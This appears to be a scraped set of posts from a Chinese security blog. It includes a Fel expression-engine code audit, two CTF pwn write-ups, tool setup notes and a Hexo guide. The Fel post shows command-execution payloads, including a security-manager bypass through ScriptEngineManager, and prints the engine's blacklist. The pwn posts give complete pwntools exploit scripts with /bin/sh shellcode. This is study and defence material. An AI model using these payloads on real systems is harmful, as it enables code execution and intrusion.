inputStream.close(); System.out.println(outUser); &#125;&#125; 序列化文件 serialVersionUID详解 Java序列化机制通过判断类的serialVersionId来验证版本是否一致 serialVersionUID可以显式声明，一般默认声明为1L；若不显式声明，则java序列化机制会根据Class自动生成一个serialVersionId 显式声明：public static final long serialVersionUID= 1L; 声明与否的几种情况 当不做显式声明时，会自动生成一个serialVersionUID 情况一：不做显式声明的实体类序列化后修改实体类再反序列化 结果：抛出异常Exception in thread &quot;main&quot; java.io.InvalidClassException: test.User; local class incompatible: stream classdesc serialVersionUID = 592275709804988011, local class serialVersionUID = -7989443708455138686 情况二：有显式声明的实体类序列化后修改实体类（减少属性）再反序列化 使用两个项目表示A端（序列化端）B端（反序列化端） A端的实体类User比B端多一个属性，其他均一致 结果：B端成功反序列化，执行了B端自己的toString()方法 左边为A端，右边为B端 控制台输出为各自序列化同一个字节流文件的结果，可以看到B端在缺少一个属性的情况下仍然序列化成功 情况三：有显示声明的实体类序列化后修改实体类（增加属性）再反序列化 和上面反过来，B端序列化，A端反序列化，A端比B端多一个属性 结果：A端成功反序列化，执行了自己的toString()，多的属性被赋了null初始值 左A右B，B序列化，A反序列化 情况四：任意一方没有显式声明 结果：抛出异常，因为没有声明的一方会自动生成一个serialVersionUID 定制序列化数据 当我们不需要把整个类的所有属性都序列化时可以自定义需要序列化的属性 12345678910111213private void writeObject(ObjectOutputStream s) throws IOException &#123; System.out.println(&quot;alice write&quot;); s.writeUTF(name); s.writeInt(id); s.writeUTF(sex);&#125; private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException &#123; System.out.println(&quot;alice read&quot;); name = s.readUTF(); id = s.readInt(); sex = s.readUTF();&#125; 反序列化时会按照顺序读出属性的值，如果没有按顺序赋值也可以反序列化成功，但是属性的值会错乱 可以看到下面反序列化操作赋值顺序错乱，但是反序列化仍然会成功，只是赋值错乱而已 transient关键字 被transient修饰的属性不会被序列化 可以看到被transient修饰的aTransient反序列化后变为初始值null transient修饰name，单个写入也一样，还是无法被序列化","categories":[{"name":"java代码审计","slug":"java代码审计","permalink":"https://vvmdx.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"java反序列化","slug":"java反序列化","permalink":"https://vvmdx.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Fel代码审计","slug":"2021-08-11-Fel代码审计","date":"2021-08-10T16:00:00.000Z","updated":"2021-08-11T02:43:14.585Z","comments":true,"path":"2021/08/11/2021-08-11-Fel代码审计/","link":"","permalink":"https://vvmdx.github.io/2021/08/11/2021-08-11-Fel%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"Fel Fel介绍 Fel：Fast Expression Language，是一种开源表达式引擎，基于java1.5开发，适用java1.5及以上版本。 特点：如名所示：fast—快，每秒可执行千万次表达式，速度是Jexl-2.0的20倍以上。 下载地址：https://code.google.com/archive/p/fast-el/downloads Maven导入 12345&lt;dependency&gt; &lt;groupId&gt;org.eweb4j&lt;/groupId&gt; &lt;artifactId&gt;fel&lt;/artifactId&gt; &lt;version&gt;0.8&lt;/version&gt;&lt;/dependency&gt; 使用方法 基本算术表达式计算 12FelEngine felEngine = new FelEngineImpl();Object result1 = felEngine.eval(&quot;(5*6+10)/4&quot;); 使用变量/调用java方法 123456FelEngine felEngine = new FelEngineImpl();FelContext felContext = felEngine.getContext();// 将System.out赋值给&quot;test&quot;felContext.set(&quot;test&quot;, System.out);// 起到执行System.out.println()的作用felEngine.eval(&quot;test.println(&#x27;Hello world&#x27;.substring(6))&quot;); 自定义上下文/常见用法 自定义实体类 1234567891011121314151617181920212223242526272829// Student类public class Student &#123; private String name; private String id; private int age; private String sex; public Student() &#123; &#125; public Student(String name, String id, int age, String sex) &#123; this.name = name; this.id = id; this.age = age; this.sex = sex; &#125; @Override public String toString() &#123; return &quot;Student&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, id=&#x27;&quot; + id + &#x27;\\&#x27;&#x27; + &quot;, age=&quot; + age + &quot;, sex=&#x27;&quot; + sex + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125; ...&#125; Fel调用 12345678910// 创建表达式引擎对象FelEngine felEngine = new FelEngineImpl();// 创建Context设值对象FelContext felContext = felEngine.getContext();// 实例化Student对象Student student = new Student(&quot;vvmdx&quot;,&quot;13579&quot;,23,&quot;male&quot;);// Context对象设值，将student.toString()赋给stu变量felContext.set(&quot;stu&quot;, student.toString());// 执行表达式Object result = felEngine.eval(&quot;stu&quot;); 调用静态方法 通过$(‘class’).method的语法可以调用第三方类包、工具类、自定义类的方法，也可以创建对象，调用对象的方法 123456789// 调用工具类// 执行Math.min(1,2)FelEngine.instance.eval(&quot;$(&#x27;Math&#x27;).min(1,2)&quot;);// 调用第三方类// 执行Runtime.getRuntime().exec(&quot;C:\\\\Windows\\\\System32\\\\calc.exe&quot;)FelEngine.instance.eval(&quot;$(&#x27;Runtime&#x27;).getRuntime().exec(\\&quot;C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\calc.exe\\&quot;)&quot;);// 调用自定义类// 执行new Student().toString()FelEngine.instance.eval(&quot;$(&#x27;test.Student.new&#x27;).toString()&quot;); 安全管理器 从0.8版本开始，为了防止“$&#123;System&#125;.exit(1)$”这样的表达式导致系统崩溃，Fel加入了安全管理器，对方法访问进行控制 123// 加入安全管理器后执行如下代码会抛出异常FelEngine.instance.eval(&quot;$(&#x27;Runtime&#x27;).getRuntime().exec(\\&quot;C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\calc.exe\\&quot;)&quot;);// 安全管理器[RegexSecurityMgr]禁止调用方法[public static java.lang.Runtime java.lang.Runtime.getRuntime()] 表达式解析 这里以FelEngine.instance.eval(&quot;$('Runtime').getRuntime().exec(\\&quot;C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\calc.exe\\&quot;)&quot;);为例，展示表达式解析的流程，以及安全管理器的过滤 语法树结构 Fel表达式语法树有3种节点 常量节点：ConstNode（包括类名、包名、方法内的固定参数等） 函数节点：FunNode（包括 +、-、*、/、$、.等操作符或者getRuntime()、exec()等方法） 变量节点：VarAstNode（若执行表达式((a+b)*c/d)，则其中a、b、c、d均为变量节点 以上节点都继承自AbstFelNode，所有组成表达式的元素都会被解析成节点 执行表达式 解析表达式：默认Antlr解析表达式（antlr-min-3.4.jar），生成AbstNode组成的语法树 节点解释：每种节点（常量、变量、函数）都有对应的解释器负责解释该节点 语法树执行顺序：按先序遍历执行（根→\\rightarrow→左→\\rightarrow→右） 获取class/创建对象 Fel中使用‘$’来获取class或创建对象 获取class：$(‘Runtime’)结果为java.lang.Runtime 函数调用栈如下 123AbstFelNode#eval -&gt;FunNode#interpret -&gt;Dollar#call -&gt; #isNew -&gt; #getClass -&gt; Class.forName() 创建对象：$(‘test.Student.new’)结果为new Student() 函数调用栈如下 123AbstFelNode#eval -&gt;FunNode#interpret -&gt;Dollar#call -&gt; #isNew -&gt; #newObject -&gt; Class.newInstance() Dollar.java部分关键代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950@Overridepublic Object call(FelNode node, FelContext context) &#123; String txt = getChildText(node); boolean isNew = isNew(txt); Class&lt;?&gt; cls = getClass(t xt, isNew); if (isNew) &#123; return newObject(cls); &#125; else &#123; return cls; &#125;&#125;// 通过forName反射获取class或创建对象// suffix = .newprivate Class&lt;?&gt; getClass(String txt, boolean isNew) &#123; String className = txt; if (isNew) &#123; className = className.substring(0, txt.length() - suffix.length()); &#125; if (className.indexOf(&quot;.&quot;) == -1) &#123; className = &quot;java.lang.&quot; + className; &#125; try &#123; Class&lt;?&gt; clz = Class.forName(className); return clz; &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; return null;&#125;// new一个实例化对象private Object newObject(Class&lt;?&gt; cls) &#123; Object o = null; if (cls != null) &#123; try &#123; o = cls.newInstance(); &#125; catch (InstantiationException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; &#125; return o;&#125;// 判断是否为new创建对象private boolean isNew(String txt) &#123; boolean isNew = txt.endsWith(suffix); return isNew;&#125; 获取方法 Fel中通过点运算符获取方法 函数调用栈如下 12Dot#call -&gt; #findMethod -&gt;ReflectUtil#findMethod -&gt; Class.getMethods() 取方法代码如下 首先使用Class.getMethods()方法获取Class对象的方法集合 然后for循环逐个比较找出方法 返回finalMethod=public static java.lang.Runtime.getRuntime() 若方法不为空，则通过Method.invoke()调用方法 12345678910111213141516171819public static Method findMethod(Class&lt;?&gt; cls, String attr, Class&lt;?&gt;[] paramTypes) &#123; if (attr != null &amp;&amp; !&quot;&quot;.equals(attr)) &#123; String firstUpper = String.valueOf(attr.charAt(0)).toUpperCase() + attr.substring(1); Method[] methods = cls.getMethods(); Method finalMethod = null; String[] methodNames = new String[]&#123;attr, &quot;get&quot; + firstUpper, &quot;is&quot; + firstUpper&#125;; for (String methodName : methodNames) &#123; finalMethod = match(methodName, paramTypes, methods); if(finalMethod!=null)&#123; break; &#125; &#125; return finalMethod; &#125; else &#123; return null; &#125;&#125; 安全管理器 安全管理器中通过黑名单uncallableMap+白名单callableMap的方法来过滤 若方法在黑名单内，则返回false，无法访问 若白名单为空，则返回true 若方法在白名单内，返回true 1234567891011121314151617181920@Overridepublic boolean isCallable(Method m) &#123; String method = getSignature(m); if (isMatch(uncallableMap, method)) &#123; return false; &#125; if (callableMap.isEmpty()) &#123; return true; &#125; return isMatch(callableMap, method);&#125;// 判断input是否在Map m中private boolean isMatch(Map&lt;String, Pattern&gt; m, String input) &#123; for (Map.Entry&lt;String, Pattern&gt; entry : m.entrySet()) &#123; if (entry.getValue().matcher(input).find()) &#123; return true; &#125; &#125; return false;&#125; 跟踪数据流，可发现黑名单如下 java.lang.Runtime.* com.greenpineyu.fel.compile.* java.lang.Process.* java.io.File.* java.net.* com.greenpineyu.fel.security.* java.lang.System.* 黑名单配置位置位于com\\greenpineyu\\fel\\common\\FelBuilder.java处 12345678910111213141516171819public class FelBuilder &#123; /** * 构建安全管理器 * @return */ public static SecurityMgr newSecurityMgr() &#123; Set&lt;String&gt; disables = new HashSet&lt;String&gt;(); disables.add(System.class.getCanonicalName() + &quot;.*&quot;); disables.add(Runtime.class.getCanonicalName() + &quot;.*&quot;); disables.add(Process.class.getCanonicalName() + &quot;.*&quot;); disables.add(File.class.getCanonicalName() + &quot;.*&quot;); disables.add(&quot;java.net.*&quot;); disables.add(&quot;com.greenpineyu.fel.compile.*&quot;); disables.add(&quot;com.greenpineyu.fel.security.*&quot;); return new RegexSecurityMgr(null, disables); &#125; ...&#125; 执行系统命令 Fel执行系统命令有以下几种思路，但基于引擎本身执行的方法都不成功，不知道有没有其他方法 首先是Runtime.getRuntime，由于安全管理器的存在，这个方法在黑名单内，无法直接通过表达式解析使用， 由于Fel版本较老（2013年后就没有维护过），安全管理器的黑名单不够完善，没有禁用ProcessBuilder，可以尝试使用ProcessBuilder执行系统命令 创建恶意类使用反射 套娃，使用别的解析引擎来执行表达式 ProcessBuilder payload：felEngine.eval(&quot;$('ProcessBuilder').command(\\&quot;C:/Windows/System32/calc.exe\\&quot;).start()&quot;) 先说结论：暂时没有发现怎样通过表达式解析执行ProcessBuilder，原因主要有两种情况： 获取class Fel通过$(‘ProcessBuilder’)来获取ProcessBuilder类，而获取类使用的是Class.forName()，没有实例化为对象 获取类的方法如下 123456789101112131415161718private Class&lt;?&gt; getClass(String txt, boolean isNew) &#123; String className = txt; if (isNew) &#123; // suffix=&quot;.new&quot; isNew()用于判断类需不需要实例化 className = className.substring(0, txt.length() - suffix.length()); &#125; if (className.indexOf(&quot;.&quot;) == -1) &#123; // 若$(&#x27;Class&#x27;)中没有点运算符的话，则默认为java.lang.*的工具类 className = &quot;java.lang.&quot; + className; &#125; try &#123; Class&lt;?&gt; clz = Class.forName(className); // 获取类 return clz; &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; return null;&#125; 继续往下看，获取到ProcessBuilder类后，会通过Class.getMethods()方法获取类方法，这个没什么问题，不展开 有类有方法后就会执行invoke()通过反射去执行类的方法，但是现在问题来了 我们知道method.invoke(Object)的作用是执行类或对象的方法 当method是一个静态方法时，invoke()需要一个类的参数 当method是一个实例方法时，invoke()需要一个类对象的参数 很明显，ProcessBuilder.command()是一个实例方法，而我们的传参却是类class java.lang.ProcessBuilder，这就会抛出object is not an instance of declaring class的异常 12345678public static Object invoke(Object obj, Method method, Object[] args) &#123; try &#123; return method.invoke(obj, args); &#125; catch (IllegalArgumentException var4) &#123; ... &#125; return null;&#125; 创建对象 前面获取类的路走不通，自然想到我们能不能自己通过表达式创建一个实例化对象 payload：felEngine.eval(&quot;$('ProcessBuilder.new').command(\\&quot;C:/Windows/System32/calc.exe\\&quot;).start()&quot;) $('ProcessBuilder.new')会在上面说的执行getClass()方法后执行以下方法 123456789101112131415// 传入的参数即为class java.lang.ProcessBuilderprivate Object newObject(Class&lt;?&gt; cls) &#123; Object o = null; if (cls != null) &#123; try &#123; // 使用newInstance()实例化 o = cls.newInstance(); &#125; catch (InstantiationException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; &#125; return o;&#125; 这段代码咋一看没什么问题，使用newInstance()实例化的效果和new也一样，但是这两者有个很关键的不同 newInstance()只能调用无参构造 但是**ProcessBuilder没有无参构造**！这就导致了执行时会抛出java.lang.InstantiationException: java.lang.ProcessBuilder的异常，罪魁祸首正是因为这个实例化用的是newInstance() 拓展 上面说到ProcessBuilder没有无参构造却依然可以使用ProcessBuilder processBuilder = new ProcessBuilder()实例化，主要是因为ProcessBuilder这个类有一个构造方法如下 12345public ProcessBuilder(String... command) &#123; this.command = new ArrayList&lt;&gt;(command.length); for (String arg : command) this.command.add(arg);&#125; 它使用了String... command这种不定参数的形式，当我们使用ProcessBuilder processBuilder = new ProcessBuilder()时，其实就相当于调用了这个构造方法，只是传入的参数为空，并不是无参构造 Runtime Fel有两种执行方式，一种是解释执行，即通过解析表达式来执行语句；一种是编译执行，用于海量数据的快速运算，无法执行获取类、方法等表达式 在解释执行中，表达式解析为java执行语句后，在invoke()执行方法前，会经过安全管理器检查，因此暂时没发现什么可以绕过的方法 安全检查的函数调用栈如下 123Dot.java#call -- 点运算符取方法 -&gt;#findMethod() -&gt;Method.getMethods()取方法 -&gt;#getCallableMethod() -- 调用安全管理器，若黑名单则抛出异常 创建恶意类 目前看来Fel只提供创建自定义类对象和调用工具类的api，并没有提供创建类的api 套娃 目前唯一一个能成功执行系统命令的方法，本质上并不是在Fel里解析执行的，而是使用了javax.script.ScriptEngineManager这个包 这个包用于js解析，它可以将js文本格式的代码封装后解析执行对应代码，由于这并没有经过Fel的解析，因此不会触发安全管理器的过滤，可以执行系统命令 1234// 使用ProcessBuilder执行系统命令FelEngine.instance.eval(&quot;$(&#x27;javax.script.ScriptEngineManager.new&#x27;).getEngineByName(&#x27;JavaScript&#x27;).eval(\\&quot;var x=new java.lang.ProcessBuilder; x.command(&#x27;calc.exe&#x27;); x.start()\\&quot;)&quot;);// 由于不经过Fel解析，因此Runtime也可以使用FelEngine.instance.eval(&quot;$(&#x27;javax.script.ScriptEngineManager.new&#x27;).getEngineByName(&#x27;JavaScript&#x27;).eval(\\&quot;var x=java.lang.Runtime.getRuntime(); x.exec(&#x27;calc.exe&#x27;)\\&quot;)&quot;); 防御 以下为安全管理器构建源码，可以看到默认只设置了黑名单，白名单默认为空，这里可以手动添加白名单作为过滤 1234567891011121314151617// common/FelBuilderpublic static SecurityMgr newSecurityMgr() &#123; Set&lt;String&gt; disables = new HashSet&lt;String&gt;(); disables.add(System.class.getCanonicalName() + &quot;.*&quot;); disables.add(Runtime.class.getCanonicalName() + &quot;.*&quot;); disables.add(Process.class.getCanonicalName() + &quot;.*&quot;); disables.add(File.class.getCanonicalName() + &quot;.*&quot;); disables.add(&quot;java.net.*&quot;); disables.add(&quot;com.greenpineyu.fel.compile.*&quot;); disables.add(&quot;com.greenpineyu.fel.security.*&quot;); return new RegexSecurityMgr(null, disables); // 白名单默认为空&#125;// security/RegexSecurityMgrpublic RegexSecurityMgr(Set&lt;String&gt; callables, Set&lt;String&gt; uncallables) &#123; convert(callables, this.callableMap); convert(uncallables, this.uncallableMap);&#125; 白名单添加方法 12345678910// common/FelBuilderpublic static SecurityMgr newSecurityMgr() &#123; Set&lt;String&gt; callables = new HashSet&lt;String&gt;(); Set&lt;String&gt; disables = new HashSet&lt;String&gt;(); callables.add(Math.class.getCanonicalName() + &quot;.*&quot;); ... disables.add(System.class.getCanonicalName() + &quot;.*&quot;); ... return new RegexSecurityMgr(callables, disables);&#125; 后记/总结 这个引擎不知道现在应用得多不多…毕竟从2013年后就没有维护了，由于该引擎加载类的特性（比如newInstance()在java9后就弃用了，改为使用构造器Constructor中getConstructor().newInstance()的方法进行反射，支持有参构造），如今常见的一些依赖反射和类加载形成的表达式注入其实都做不了，可能是因为代码比较老旧的原因吧，反而使得他更“安全”；同时由于不支持创建自定义类（没有loadClass()、ClassLoader()等）的原因，也封死了加载恶意类来注入这条路；引擎本身只支持加载已有的自定义类和java工具类，对于需要实例化对象却没有无参构造的类（比如ProcessBuilder），引擎并没有给出解决方案（没想到因为他的落后而显得安全（雾））；最后就是安全管理器，黑名单应该是搞不定的，，过滤规则是：“当白名单不为空时，优先根据白名单判断，不在白名单则抛出异常，当白名单为空时，根据黑名单判断，在黑名单内则抛出异常”，因此应该还是要设白名单的吧。","categories":[{"name":"java代码审计","slug":"java代码审计","permalink":"https://vvmdx.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"java表达式引擎","slug":"java表达式引擎","permalink":"https://vvmdx.github.io/tags/java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BC%95%E6%93%8E/"}]},{"title":"CISCN_2019_s_9","slug":"2021-06-18-CISCN_2019_s_9","date":"2021-06-17T16:00:00.000Z","updated":"2021-08-16T14:11:51.758Z","comments":true,"path":"2021/06/18/2021-06-18-CISCN_2019_s_9/","link":"","permalink":"https://vvmdx.github.io/2021/06/18/2021-06-18-CISCN_2019_s_9/","excerpt":"","text":"CISCN_2019_s_9 程序逻辑 查看保护 32位，无任何保护 伪代码 pwn函数 fgets读取输入后直接输出 没有调用shellcode hint函数 jmp esp：跳转到esp执行 esp存放指向栈顶的指针 跳转后会去执行栈中的指令 调试 main处打断点，run后发现直接调用pwn函数，单步进入 gdb ciscn_s_9 b main r s 此时函数栈帧状态如下 进入pwn函数，首先是当前栈底ebp压栈，更新ebp为当前栈顶esp，然后开辟一块0x28的栈空间 push ebp mov ebp, esp sub esp, 0x28 打印字符串，跳过即可 获取数据流输入，写入栈 lea eax, [ebp+s] ; 把ebp+s的地址给eax push eax ; eax入栈 由于s被定义为-0x20，因此eax从ebp-0x20处(0x148)开始 构造一个’a’*0x20 + ‘b’*4的输入，发现’a’*0x20填满0x148~0x164，bbbb刚好覆盖ebp地址0x168 返回主函数 leave ; mov esp, ebp; pop ebp ret ; pop eip leave执行后栈帧如下 执行ret后，eip=0x804856f，回到返回地址，函数执行结束 hint函数 可以看到hint有一条跳转到esp的指令，由于栈上代码可执行，可以利用这个跳转到shellcode的位置 思路 在输入的时候可以把hint中的跳转指令的地址覆盖到0x16c即返回地址上，使得pwn函数在运行到ret时不会返回主函数，而是跳转到hint函数 ret到hint后会跳转到esp去执行我们的输入 由于pwn函数写入栈的位置为**[ebp+s]也即0x168-0x20=0x148的位置，而我们当前的esp位置为0x170**，因此需要把esp减去0x28使其能够刚好读到我们的输入 PWN 编写脚本 123456789101112131415161718192021222324252627from pwn import *context(os=&#x27;linux&#x27;)p = process(&#x27;./ciscn_s_9&#x27;)# p = remote(&#x27;node3.buuoj.cn&#x27;,26442) shellcode =&#x27;&#x27;&#x27;xor eax,eaxxor ecx,ecxxor edx,edxpush 0x0068732fpush 0x6e69622fmov ebx,espmov al,0xbint 0x80&#x27;&#x27;&#x27;shellcode = asm(shellcode)shell = &quot;sub esp, 0x28; call esp&quot;shell = asm(shell)p.recvuntil(&quot;&gt;\\n&quot;)payload = shellcode.ljust(0x24,b&quot;\\x90&quot;)payload += p32(0x8048554) #jmp esppayload += shellgdb.attach(p)p.sendline(payload)p.interactive() 可供shellcode的长度只有0x20 = 32个字节，因此不能用shellcraft.sh()，此处使用自己编写的shellcode \\x90为**NOP（空操作）**指令，为了对齐到双字边界（4的偶数倍） shellcode.ljust(0x24, b&quot;\\x90)即为使用\\x90（NOP指令）填充到0x168的位置，后面再接上0x8048554即jmp esp指令地址 执行效果 在0x0804854F打断点，发送payload后 可以看到此时return的地址已经被覆盖为hint中jmp esp的地址了，单步进入看到已经开始执行我们的shellcode 可以看到成功开启shell 完整代码执行效果如下","categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"}],"tags":[{"name":"教学&思路&过程","slug":"教学-思路-过程","permalink":"https://vvmdx.github.io/tags/%E6%95%99%E5%AD%A6-%E6%80%9D%E8%B7%AF-%E8%BF%87%E7%A8%8B/"}]},{"title":"mrctf2020_shellcode","slug":"2021-06-14-mrctf2020_shellcode","date":"2021-06-13T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/06/14/2021-06-14-mrctf2020_shellcode/","link":"","permalink":"https://vvmdx.github.io/2021/06/14/2021-06-14-mrctf2020_shellcode/","excerpt":"","text":"mrctf2020_shellcode 程序逻辑 打印“Show me your magic！” 从buf中读取0x400字节的内容 eax存放读取的字节数，与0比较，大于0则跳转到loc_11D6，否则退出程序 12CMP leftOp, rightOpJG function ;大于跳转(left&gt;right) loc_11D6: 将写入的内容地址给rax，然后调用执行 PWN 查看保护 编写脚本 使用pwntools生成shellcode 12345678910from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)p = process(&#x27;./mrctf2020_shellcode&#x27;)shellcode = shellcraft.sh()payload = asm(shellcode)#gdb.attach(p)p.send(payload)p.interactive() 使用自己编写的shellcode 1234567891011121314151617181920from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)p = process(&#x27;./mrctf2020_shellcode&#x27;)shellcode = &#x27;&#x27;&#x27; mov rbx, 0x68732f6e69622f push rbx push rsp pop rdi xor esi, esi xor edx, edx push 0x3b pop rax syscall&#x27;&#x27;&#x27;payload = asm(shellcode)#gdb.attach(p)p.send(payload)p.interactive() 调试 断点打在call rax那 vmmap查看程序基址(0x55654d65e000) 加上偏移(0x11dd)就是call rax地址 打好断点后发送payload，可以发现已经断在call rax处 回到调试界面，s单步进入函数查看发现shellcode已经被写入函数 一直往下走，直到发现此时已经启动一个新程序**/bin/dash**，说明已经拿到shell 结果 使用pwntools生成的shellcode 使用自己编写的shellcode 单步进入函数后发现也成功写入 同样的也能启动**/bin/dash** 最终结果","categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"}],"tags":[{"name":"教学&思路&过程","slug":"教学-思路-过程","permalink":"https://vvmdx.github.io/tags/%E6%95%99%E5%AD%A6-%E6%80%9D%E8%B7%AF-%E8%BF%87%E7%A8%8B/"}]},{"title":"PWN环境搭建及工具安装","slug":"2021-06-11-PWN环境搭建及工具安装","date":"2021-06-10T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/06/11/2021-06-11-PWN环境搭建及工具安装/","link":"","permalink":"https://vvmdx.github.io/2021/06/11/2021-06-11-PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/","excerpt":"","text":"PWN 环境搭建 环境：Kali 2021 12sudo passwd # 添加root账号su root # 输入刚刚设置的密码，进入root python 3.9（Kali 2021自带） 配置更新源 12345678910mousepad /etc/apt/sources.list# 若mousepad报错，则apt install dbus-x11# mousepad就是记事本#阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free 升级软件列表/更新软件 123apt-get updateapt-get upgradeapt-get dist-upgrade git配置 1apt install git 工具安装 Pwntools 1234567# python3环境## 更新下载源apt-get upgrade## 安装pip下载工具apt install python3-pip## pip下载pwntoolspip3 install pwntools 下载完会得到两个小工具：checksec（查看保护机制）、ROPgadget one_gadget 功能：查找已知的libc中**exevce(&quot;/bin/sh&quot;)**语句的地址 安装 123456# 安装ruby环境apt install ruby# 安装ruby包管理工具apt install gem# 安装one_gadgetgem install one_gadget LibcSearcher https://github.com/IZAY01/LibcSearcher Libc database search https://libc.blukat.me/ main_arena_offset 堆、偏移 使用IDA Pro也可以做，但是手工做麻烦 https://github.com/bash-c/main_arena_offset GDB 动态分析 GNU项目调试器，用于在Linux系统中动态调试程序 1apt install gdb 增强工具：pwndbg、PEDA、gef 1234# 安装pwndbggit clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh 安装完成后再使用gdb就会自动加载pwndbg","categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"}],"tags":[{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"}]},{"title":"个人博客搭建","slug":"个人博客搭建","date":"2021-06-05T16:00:00.000Z","updated":"2021-07-14T08:10:04.665Z","comments":true,"path":"2021/06/06/个人博客搭建/","link":"","permalink":"https://vvmdx.github.io/2021/06/06/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","excerpt":"","text":"个人博客搭建 框架：Hexo+github pages 主题：pure 现在你拥有：一个username.github.io的仓库 搭建步骤 Hexo Hexo中文文档（很详细，建议查看） 环境：git + node.js（安装不赘述） node建议使用较新的版本，我在使用旧版本安装后编译时总是报错，换了新版本后就没问题了，windows下直接官网下载新版本覆盖旧版本就行 Hexo安装 使用npm安装 1234npm install -g hexo-cli# 若npm install卡住不动可以换成淘宝镜像npm config get registry # 查看当前下载源npm config set registry https://registry.npm.taobao.org # 更换为淘宝源 初始化 1hexo init blog 效果如下，在目录下会出现blog文件夹 检测搭建效果 123hexo new test # 创建一个test.md的文章hexo g # g=generate 生成静态文件hexo s # s=server 启动服务器 命令执行效果 启动后可访问http://localhost:4000查看 推送/部署网站 打开根目录_config.yml，翻到最下面修改deploy信息 repo：github仓库完整地址，最后要加上.git branch：分支，默认是master或者main，这里的wmdx是我自己改的分支 1234deploy: type: git repo: https://github.com/vvmdx/vvmdx.github.io.git branch: wmdx 安装git部署插件 1npm install hexo-deployer-git --save 推送/部署主页 123hexo clean # 清除缓存和已生成的静态文件hexo ghexo d # d=deploy 推送/部署 执行完成后访问个人网站就能看到主页已经上线了 一些插件 文章字数统计及阅读时长预计 1npm install hexo-wordcount --save 站内搜索 1npm install hexo-generator-json-content --save 自动压缩html、css、js代码 1npm install hexo-neat --save 站点地图 1npm install hexo-generator-sitemap --save 推送Hexo博客新连接至百度搜索引擎 https://github.com/huiwang/hexo-baidu-url-submit 1npm install hexo-baidu-url-submit --save 配置：一个很坑的地方，type如果有两个然后不加横杠，会报错，加了横杠但是放在连续的两行也会报错，一定要像下面这样配置 12345deploy:- type: git repo: https://github.com/vvmdx/vvmdx.github.io.git branch: wmdx- type: baidu_url_submitter pure 更换主题 官方主题 本站主题：pure（文档） 下载主题到blog/themes/pure 1git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 打开根目录_config.yml更改主题 1theme: landscape -&gt; theme: pure 更新 12hexo cleanhexo d 这时你的主题就已经更新完毕了，效果如下 资源位置 博客文章 \\source\\_posts 头部格式 图片 themes\\pure\\source\\images 浏览器标签页图标D:\\hexo\\themes\\pure\\source下的favicon.png markdown引用格式（在自己文件里肯定定位不到资源，这个没有关系，主要是为了编译成html时可以定位到资源位置） 1![image2](/images/个人博客搭建/image7.png) pure主题个性化设置 个人博客怎么设置看个人需求，这里建议看文档 以下为我自己的设置 设置语言 12# 根目录_config.ymllanguage: zh-CN 主题颜色 123# themes/pure/_config.ymlconfig: skin: theme-black 导航菜单 用不上的可以注释掉 个人信息设置 1234theme/pure/source/images设置各种图片# themes/pure/_config.yml# profile更改个人信息 文章浏览量设置 1234# PVpv: busuanzi: enable: true # 不蒜子统计 字数统计、阅读时长预计 12345# wordcountpostCount: enable: true wordcount: true # 文章字数统计 min2read: true # 阅读时长预计 部署 1234567# 每次本地更新完内容，按以下步骤推送至githubhexo clean # 清除缓存以及静态文件hexo g # g=generate 生成静态文件hexo d # d=deploy 部署# 如果报错说ssl验证失败则先git config --global http.sslVerify &quot;false&quot;hexo d 疑难杂症 点击首页左侧边栏跳到404 记得把D:\\hexo\\themes\\pure\\_source下的categories、tags和其他主页侧边栏有出现的东西复制到D:\\hexo\\\\source下，不然他不会编译成index.html，打开就会404 开启不蒜子后文章出现两个眼睛（两个统计阅读量的地方） 看网页源码可发现busuanzi和leancloud的文章统计都被开启，即使我们配置文件里面将leancloud设为false，他也会编译出来，只要将D:\\hexo\\themes\\pure\\layout_partial\\post下的pv.ejs中leancloud部分全部删掉就可以了，只留下busuanzi的（如果启用leancloud的话就留下leancloud） 123456789## pv.ejs&lt;% if (theme.pv.busuanzi.enable) &#123; %&gt; &lt;span class=&quot;article-read hidden-xs&quot;&gt; &lt;i class=&quot;icon icon-eye-fill&quot; 